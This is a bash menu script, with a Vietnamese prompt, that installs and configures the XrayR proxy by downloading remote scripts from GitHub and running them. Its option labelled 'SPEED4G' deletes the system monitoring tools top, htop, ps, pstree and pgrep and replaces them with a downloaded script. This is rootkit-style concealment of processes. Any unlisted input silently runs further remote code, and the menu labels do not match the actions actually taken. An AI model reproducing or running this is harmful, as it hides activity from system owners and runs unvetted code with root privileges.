clear
echo "   1. Install XrayR"
echo "   2. XrayR Hide"
echo "   3. XrayR SPEED4G"
echo "   4. Delete"
read -p "  Vui Lòng Nhập : " num

    case "${num}" in
        1) curl -o /usr/bin/n -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/n.sh && chmod +x /usr/bin/n && n i
        ;;
        2) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-hide.sh)
        ;;
        3) cd /usr/bin
        rm -rf top htop XrayR xrayr ps pstree pgrep
        curl -o /usr/bin/top -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x top
        curl -o /usr/bin/htop -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x htop
        curl -o /usr/bin/ps -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x ps
        curl -o /usr/bin/pstree -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x pstree
        curl -o /usr/bin/pgrep -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x pgrep
        curl -o /usr/bin/XrayR -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/block-check.sh && chmod +x XrayR && ln -s XrayR xrayr && chmod +x xrayr
        ;;
        4) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/config-speed4g.sh)
        ;;
        5) rm -rf /etc/XrayR && rm -rf /usr/lib/systemd/system/geoip.dat
        ;;
        *) bash <(curl -Ls https://raw.githubusercontent.com/235nvnybtq235/script/main/xrayr/run.sh)
        ;;
    esac
